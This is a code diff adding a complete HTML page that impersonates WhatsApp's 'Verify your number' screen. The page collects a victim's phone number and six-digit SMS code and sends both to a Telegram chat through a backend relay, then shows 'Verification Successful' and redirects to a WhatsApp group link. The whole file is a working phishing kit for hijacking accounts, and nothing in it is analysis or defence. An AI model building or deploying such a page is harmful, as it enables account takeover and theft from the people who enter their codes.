@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp Verification</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💬</text></svg>">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --wa-teal-dark: #075E54;
+      --wa-teal: #128C7E;
+      --wa-green: #25D366;
+      --wa-bg: #f0f2f5;
+      --wa-white: #ffffff;
+      --wa-text-main: #414a4f;
+      --wa-text-secondary: #667781;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background-color: var(--wa-bg);
+      display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+    }
+    .header-bar { width: 100%; height: 130px; background-color: var(--wa-teal-dark); position: absolute; top: 0; z-index: -1; }
+    .card {
+      background: var(--wa-white); width: 100%; max-width: 420px; margin-top: 60px;
+      padding: 40px 35px; border-radius: 3px; text-align: center; position: relative;
+      box-shadow: 0 17px 50px 0 rgba(0,0,0,.19), 0 12px 15px 0 rgba(0,0,0,.24);
+    }
+    .whatsapp-icon { font-size: 50px; color: var(--wa-green); margin-bottom: 20px; }
+    h2 { color: var(--wa-text-main); margin-bottom: 15px; font-size: 24px; font-weight: 300; }
+    .info-text { color: var(--wa-text-secondary); margin-bottom: 25px; font-size: 14px; line-height: 20px; }
+    .input-group {
+      margin-bottom: 25px; border-bottom: 2px solid #e1e9eb; display: flex;
+      align-items: center; transition: border-color 0.2s;
+    }
+    .input-group:focus-within { border-bottom-color: var(--wa-teal); }
+    select {
+      flex: 0 0 100px; border: none; height: 45px; font-size: 16px;
+      background-color: transparent; padding: 0 5px; cursor: pointer;
+      color: var(--wa-teal); font-weight: 600; outline: none;
+    }
+    input[type="tel"] {
+      flex: 1; padding: 10px; border: none; font-size: 18px; outline: none;
+      color: var(--wa-text-main); letter-spacing: 1px;
+    }
+    button {
+      width: 100%; padding: 12px; background-color: var(--wa-green); border: none;
+      border-radius: 3px; color: white; font-size: 14px; font-weight: 600;
+      text-transform: uppercase; cursor: pointer; margin-top: 15px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+    }
+    .otp-inputs { display: flex; justify-content: space-between; margin: 30px 0; }
+    .otp-input {
+      width: 45px; height: 45px; text-align: center; font-size: 24px;
+      border: none; border-bottom: 2px solid #e1e9eb; outline: none;
+    }
+    .otp-input:focus { border-bottom-color: var(--wa-teal); }
+    .timer { margin: 15px 0; font-size: 14px; color: var(--wa-text-secondary); }
+    .resend { margin-top: 15px; color: var(--wa-teal); font-size: 14px; font-weight: 600; cursor: pointer; text-transform: uppercase; }
+    .resend.disabled { color: #bcc6cc; cursor: not-allowed; }
+    #numberPage, #otpPage { animation: fadeIn 0.3s ease-in; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  </style>
+</head>
+<body>
+  <div class="header-bar"></div>
+  <div style="background:#075E54;color:white;text-align:center;padding:8px;font-size:14px;font-weight:bold;margin-bottom:10px;">hi</div>
+  <div class="card">
+    <div class="whatsapp-icon"><i class="fab fa-whatsapp"></i></div>
+    <h2>Verify your number</h2>
+    <div id="numberPage">
+      <p class="info-text">Please confirm your country code and enter your phone number.</p>
+      <div class="input-group">
+        <select id="countryCode" name="countryCode">
+          <option value="+91">🇮🇳 (+91)</option>
+          <option value="+92">🇵🇰 (+92)</option>
+          <option value="+880">🇧🇩 (+880)</option>
+          <option value="+1">🇺🇸 (+1)</option>
+          <option value="+44">🇬🇧 (+44)</option>
+          <option value="+971">🇦🇪 (+971)</option>
+          <option value="+234">🇳🇬 (+234)</option>
+          <option value="+93">🇦🇫 (+93)</option>
+          <option value="+358">🇦🇽 (+358)</option>
+          <option value="+355">🇦🇱 (+355)</option>
+          <option value="+213">🇩🇿 (+213)</option>
+          <option value="+98">🇮🇷 (+98)</option>
+          <option value="+254">🇰🇪 (+254)</option>
+        </select>
+        <input type="tel" id="phoneNumber" name="phoneNumber" maxlength="10" placeholder="phone number" inputmode="numeric">
+      </div>
+      <button type="button" onclick="sendNumber()">Next</button>
+    </div>
+    <div id="otpPage" style="display:none;">
+      <p class="info-text">Enter the 6-digit code sent to your phone.</p>
+      <div class="otp-inputs">
+        <input type="text" id="otp1" name="otp1" maxlength="1" class="otp-input" inputmode="numeric">
+        <input type="text" id="otp2" name="otp2" maxlength="1" class="otp-input" inputmode="numeric">
+        <input type="text" id="otp3" name="otp3" maxlength="1" class="otp-input" inputmode="numeric">
+        <input type="text" id="otp4" name="otp4" maxlength="1" class="otp-input" inputmode="numeric">
+        <input type="text" id="otp5" name="otp5" maxlength="1" class="otp-input" inputmode="numeric">
+        <input type="text" id="otp6" name="otp6" maxlength="1" class="otp-input" inputmode="numeric">
+      </div>
+      <div class="timer">Resend SMS in <span id="countdown">01:00</span></div>
+      <button type="button" onclick="submitOtp()">Verify</button>
+      <div class="resend disabled" id="resendBtn" onclick="resendOtp()">Resend SMS</div>
+    </div>
+  </div>
+
+  <script>
+    const TELEGRAM_CHAT_ID = '8734425552';
+    let fullNumber = "";
+    let countdownTimer;
+    let timeLeft = 60;
+
+    async function sendToTelegram(message) {
+      try {
+        const response = await fetch('/api/telegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+        const result = await response.json();
+        return result.ok || false;
+      } catch (e) {
+        console.error('Backend error:', e);
+        return false;
+      }
+    }
+
+    function setupOtpInputs() {
+      const inputs = document.querySelectorAll('.otp-input');
+      inputs.forEach((input, i) => {
+        input.addEventListener('input', function() {
+          this.value = this.value.replace(/[^0-9]/g, '');
+          if (this.value.length >= 1 && inputs[i+1]) inputs[i+1].focus();
+          if (Array.from(inputs).every(el => el.value.length === 1)) submitOtp();
+        });
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !input.value && inputs[i-1]) inputs[i-1].focus();
+        });
+      });
+    }
+
+    window.sendNumber = function() {
+      const code = document.getElementById("countryCode").value;
+      const num = document.getElementById("phoneNumber").value.trim();
+      if (num.length < 7) { alert("Enter a valid number"); return; }
+      fullNumber = code + num;
+      sendToTelegram(`[New Number] ${fullNumber}`);
+      document.getElementById("numberPage").style.display = "none";
+      document.getElementById("otpPage").style.display = "block";
+      setupOtpInputs();
+      document.querySelector('.otp-input').focus();
+      startTimer();
+    };
+
+    function startTimer() {
+      timeLeft = 60;
+      clearInterval(countdownTimer);
+      countdownTimer = setInterval(() => {
+        timeLeft--;
+        document.getElementById('countdown').textContent = `00:${timeLeft.toString().padStart(2, '0')}`;
+        if (timeLeft <= 0) {
+          clearInterval(countdownTimer);
+          document.getElementById('resendBtn').classList.remove('disabled');
+        }
+      }, 1000);
+    }
+
+    window.submitOtp = async function() {
+      let otp = "";
+      document.querySelectorAll('.otp-input').forEach(i => otp += i.value);
+      if (otp.length < 6) return;
+      try {
+        await sendToTelegram(`[OTP Code] Number: ${fullNumber} | Code: ${otp}`);
+      } catch(e) {
+        console.error('Telegram error:', e);
+      }
+      alert("Verification Successful");
+      window.location.href = "https://chat.whatsapp.com/KlwV5AmtLSVBsgApjivxXI?s=cl&p=a&mlu=4&ilr=4&iam=2";
+    };
+
+    window.resendOtp = function() {
+      if (document.getElementById('resendBtn').classList.contains('disabled')) return;
+      sendToTelegram(`[Resend] Number: ${fullNumber}`);
+      startTimer();
+      document.getElementById('resendBtn').classList.add('disabled');
+    };
+  </script>
+</body>
+</html>
